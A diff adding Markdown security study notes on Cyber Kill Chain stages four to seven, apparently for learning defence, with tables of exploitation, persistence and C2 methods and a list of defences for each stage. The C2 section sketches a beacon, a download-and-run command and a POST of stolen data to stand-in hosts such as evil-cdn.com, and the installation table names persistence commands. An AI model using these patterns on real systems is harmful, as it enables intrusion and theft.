@@ -637,3 +637,168 @@ Attacker delivers the weapon to the target.
 
 ## 4: EXPLOITATION
 The delivered weapon exploits a vulnerability and executes.
+
+ Trigger the vulnerability to run malicious code
+
+#### What Gets Exploited:
+| Vulnerability Type | Description | Example |
+| :--- | :--- | :--- |
+| **Software Vulnerability** | Bug in application | Log4Shell (CVE-2021-44228) |
+| **User Action** | Tricking user to execute | "Enable macros" button |
+| **Zero-Day** | Unknown vulnerability | Exploit before patch exists |
+| **Configuration Weakness** | Misconfiguration | Default passwords, open shares |
+| **Browser Exploit** | Vulnerability in web browser | Drive-by download |
+
+#### How to Defend Against Exploitation:
+1. Patch Management
+```
+- Regular software updates
+- Emergency patching for critical CVEs
+- Automated patch deployment
+```
+
+2. Vulnerability Scanning
+```
+- Regular vulnerability assessments
+- Prioritize critical CVEs
+```
+
+
+## 5:  INSTALLATION
+Malware installs itself on the victim system to maintain access.
+
+#### Installation Methods:
+| Method | Description | Example |
+| :--- | :--- | :--- |
+| **Registry Modification** | Add startup entry | `HKLM...\Run` |
+| **Scheduled Task** | Create task to run at boot/login | `schtasks /create` |
+| **Service Creation** | Install as Windows service | `sc create malware_svc` |
+| **DLL Injection** | Inject into legitimate process | Injecting into `explorer.exe` |
+| **Startup Folder** | Drop file in startup folder | `C:\Users...\Startup\` |
+| **Browser Extension** | Malicious browser add-on | Fake ad-blocker |
+| **Bootkit/Rootkit** | Low-level system infection | MBR/UEFI modification |
+
+####  How to Defend Against Installation:
+1. Endpoint Protection
+```
+- Antivirus/EDR (detect malware installation)
+- Behavioral monitoring
+- Block unauthorized file writes to system folders
+```
+
+2. Application Whitelisting
+```
+- Only approved applications can run
+- Blocks installation of unauthorized software
+```
+
+3. Integrity Monitoring
+```
+- Monitor registry for unauthorized changes
+- File integrity monitoring (FIM)
+- Alert on new scheduled tasks/services
+```
+
+
+## 6: COMMAND & CONTROL (C2)
+- Malware communicates with attacker's server to receive commands and send data.
+ - Establish two-way communication channel for attacker to control compromised system
+
+
+#### C2 Communication Methods:
+
+| Protocol | Description | Example |
+| :--- | :--- | :--- |
+| **HTTP/HTTPS** | Looks like normal web traffic | Beaconing to `evil.com/update` |
+| **DNS** | Commands hidden in DNS queries | Tunneling via TXT records |
+| **IRC** | Internet Relay Chat | Old-school chat protocol |
+| **Social Media** | Commands via Twitter/Facebook | Bot checks Twitter for commands |
+| **Email** | Commands via email | Malware checks Gmail |
+| **Cloud Services** | Dropbox, OneDrive, Pastebin | Upload/download via legit service |
+| **Custom Protocols** | Proprietary protocol | Encrypted binary protocol |
+
+#### C2 working
+```
+TYPICAL C2 FLOW:
+
+1. BEACON (Malware → C2 Server)
+   Infected PC: "I'm here! Waiting for commands..."
+   
+   HTTP Request:
+   GET http://evil-cdn.com/update.php?id=VICTIM123
+   
+2. COMMAND (C2 Server → Malware)
+   C2 Server: "Download additional tool from..."
+   
+   HTTP Response:
+   200 OK
+   Body: {"cmd":"download","url":"http://tools.evil.com/scanner.exe"}
+
+3. EXECUTION (Malware executes command)
+   Malware: Downloads and runs scanner.exe
+
+4. EXFILTRATION (Malware → C2 Server)
+   Malware: "Here's the data you wanted..."
+   
+   POST http://evil-cdn.com/upload.php
+   Body: [stolen data]
+
+5. REPEAT (Every X minutes/hours)
+   Malware checks in regularly for new commands
+```
+
+
+
+#### How to Defend Against C2:
+1. Network Monitoring
+```
+- Monitor outbound connections
+- Unusual beaconing patterns (regular intervals)
+- Connections to newly registered domains
+- Geographic anomalies (why is accounting PC talking to Russia?)
+```
+
+2. DNS Monitoring
+```
+- Long domain names (data encoding)
+- High volume of DNS queries
+- Queries to suspicious TLDs (.tk, .ml, etc.)
+```
+
+3. Threat Intelligence
+```
+- IOC feeds (known C2 servers)
+- SIEM correlation with threat intel
+```
+
+
+## 7: ACTIONS ON OBJECTIVE
+Attacker achieves their final goal (data theft, ransomware, destruction).
+
+
+#### Common Objectives:
+
+
+
+
+####  How to Defend Against Actions on Objective:
+1. ==Data Loss Prevention (DLP)==
+```
+- Monitor large data transfers
+- Block uploads to unauthorized cloud services
+- Encrypt sensitive data at rest
+```
+
+2. Backup Strategy
+```
+- Offline/immutable backups
+- Regular backup testing
+- Geographic separation
+```
+
+3. Privilege Management
+```
+- Least privilege principle
+- Separate admin accounts
+- Just-in-time access
+```
